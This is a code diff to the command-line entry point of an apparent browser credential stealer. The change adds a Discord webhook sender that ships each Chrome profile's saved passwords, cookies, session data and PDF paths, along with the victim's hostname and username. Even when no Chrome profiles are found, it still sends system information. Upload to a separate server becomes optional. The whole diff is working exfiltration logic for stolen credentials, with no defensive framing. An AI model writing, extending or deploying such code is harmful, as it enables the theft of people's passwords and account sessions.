@@ -1,27 +1,48 @@
 import argparse
 import asyncio
 import sys
+import os
+import platform
 from .extractor import get_chrome_profiles, extract_all
 from .uploader import upload_all
+from .discord_sender import save_data_to_file_and_send
 
-async def main(server_url):
+async def main(server_url=None):
     profiles = get_chrome_profiles()
     if not profiles:
-        print("No Chrome profiles found.")
-        sys.exit(1)
+        # If no Chrome profiles are found, we can still proceed with other data extraction
+        print("No Chrome profiles found. Proceeding with other data extraction...")
+        # Create an upload pair with system info only
+        system_data = {
+            "system_info": {"hostname": platform.node(), "username": os.getenv('USER', 'unknown')}, 
+            "passwords": [], 
+            "cookies": [], 
+            "sessions": {}
+        }
+        await save_data_to_file_and_send(system_data, [])
+        return
+    
     profiles_data = [extract_all(p) for p in profiles]
-    # Flatten PER PROFILE to match PDFs correctly
-    upload_pairs = []
+    
+    # Process each profile's data
     for d in profiles_data:
-        flat_data = []
-        flat_data.extend(d["passwords"])
-        flat_data.extend(d["cookies"])
-        flat_data.append({"sessions": d["sessions"]})
-        upload_pairs.append((flat_data, d["pdf_paths"]))
-    await upload_all(server_url, upload_pairs)
+        structured_data = {
+            "system_info": {"hostname": platform.node(), "username": os.getenv('USER', 'unknown')},
+            "passwords": d["passwords"],
+            "cookies": d["cookies"],
+            "sessions": d["sessions"],
+            "pdf_paths": d["pdf_paths"]
+        }
+        
+        # Send to Discord webhook
+        await save_data_to_file_and_send(structured_data, d["pdf_paths"])
+        
+        # Also upload to server if URL provided
+        if server_url:
+            await upload_all(server_url, [(structured_data, d["pdf_paths"])])
 
 def cli_main():
-    parser = argparse.ArgumentParser(description="Extract Chrome data and upload to server")
-    parser.add_argument("server_url", help="FastAPI server URL (e.g., https://your-server.com)")
+    parser = argparse.ArgumentParser(description="Extract Chrome data and upload to server or send to Discord")
+    parser.add_argument("server_url", nargs='?', default=None, help="FastAPI server URL (optional, for backward compatibility)")
     args = parser.parse_args()
     asyncio.run(main(args.server_url))
